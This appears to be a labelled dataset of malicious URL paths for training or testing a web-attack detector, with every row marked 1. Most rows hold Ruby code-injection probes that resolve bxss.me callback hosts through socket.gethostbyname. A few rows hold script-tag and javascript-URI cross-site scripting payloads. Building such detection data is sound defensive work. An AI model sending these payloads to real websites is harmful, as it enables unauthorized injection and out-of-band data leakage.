sentences	labels
socket.gethostbyname('hitha' 'nofzfkuy3fc33.bxss.me.')[3].to_s) '/***************/16/images/result.css 	 1
socket.gethostbyname('hitpu' 'drnhirnd62037.bxss.me.')[3].to_s) '/**/images/common.js 	 1
/******/system/2019/11/25/javascript:window.print() 	 1
socket.gethostbyname(""hitpc"" ""bnayqclb6daa5.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/css.js 	 1
socket.gethostbyname(""hitzk"" ""adjmyrmhaa66a.bxss.me."")[3].to_s) ""/*/xys.css 	 1
socket.gethostbyname(""hitwo"" ""kfxjlwrtb09d0.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/main.css 	 1
socket.gethostbyname('hitqp' 'tgqlreona377f.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 1
/******/zlhz/"><script>alert(189)</script> 	 1
socket.gethostbyname(""hitem"" ""kvfaqpsy44544.bxss.me."")[3].to_s) ""/*********/linkbutton.css 	 1
/******/system/2021/11/15/javascript:void(0); 	 1
/******/system/2020/10/12/javascript:void(0); 	 1
socket.gethostbyname('hityh' 'msasboncb276e.bxss.me.')[3].to_s) '/*******/jquery.parser.js 	 1
socket.gethostbyname(""hitlm"" ""sycvkumk52fef.bxss.me."")[3].to_s) ""/**/lib/security/sm2.js 	 1
socket.gethostbyname('hitib' 'bfbfapmab2330.bxss.me.')[3].to_s) '/***************/16/images/autocomplete.css 	 1
/******/qhkc/zj/<img src="javascript:alert(270)"> 	 1
